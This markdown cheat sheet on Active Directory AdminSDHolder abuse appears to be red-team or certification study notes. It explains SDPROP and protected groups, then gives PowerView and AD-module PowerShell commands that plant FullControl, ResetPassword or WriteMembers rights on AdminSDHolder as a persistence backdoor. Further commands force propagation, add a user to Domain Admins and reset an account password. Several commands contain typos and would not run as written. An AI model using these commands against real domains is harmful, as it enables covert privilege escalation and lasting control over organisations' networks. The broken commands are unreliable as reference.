# ACLs - AdminSDHolder (Admin Security Descriptor Holder)

* resides in the System container of a domain and used to control the permissions; using an ACL; for certain built-in privileged groups (protected groups)

* Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.

* Protected Groups
  * account operators
  * backup operators
  * servers operators
  * print operators
  * domain operators
  * domain admins
  * replicator
  * enterprise admins
  * domain controllers
  * read-only domain controllers
  * schema admins
  * administrators

* well known abuse of some of the protected groups. below can log on locally to DC

protected groups | can do
-----------------|--------
account operators | cannot modigy DA/EA/BA groups. can modify nested group within these groups
backup operators | backup GPO, edit to add SID of controlled account to a privileged group and Restore
server operators | run a command as system (using the disabled browser service)
print operators | copy ntds.dit backup, load device drivers


* with DA privs (full control/write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object
* in 60 mintues (when SDPROP runs) the user will be added with full control to the AC groups like domain admins without being a member of it

* add FullControl permission for a user to the AdminSDHolder using PowerView as DA
```powershell
Add-ObjectACL -TargerADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName username -Rights All -Verbose
```

* using AD module and SET-ADACL
```powershell
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=sub,DC=domain,DC=local' -Principal username -Verbose
```

* other interesting permissions (resetpassword, writemembers) for a user to the AdminSDHolder
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName username -Rights ResetPassword -Verbose


Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName username -Rights WriteMembers -Verbose
```

* Run SDProp manually using Invoke-SDPropagator.ps1
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

* pre-server 2008 machines:
```powershell
Invoke-SDPropagator -taskname FixupInheritance -timeoutMinutes 1 -showProgress -Verbose
```

* check the domain admins permission - powerview as normal user
```powershell
Get-ObjectACL -SamAccountName "Domain Admins" - ResolveGUIDs | ?{$_.IdentityReference -match 'username'}
```

* using AD module
```powershell
(Get-Acl -Path 'AD:\CN=DOmain Admins,CN=Users,DC=sub,DC=domain,DC=local').Access | ?{$_.IdentityReference -match 'username'}
```

* asbusing FullControl using powerview_dev
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

* using AD module
```powershell
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

* abusing ResetPassword using powerview
```powershell
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

* using AD module
```powershell
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force -Verbose
```



































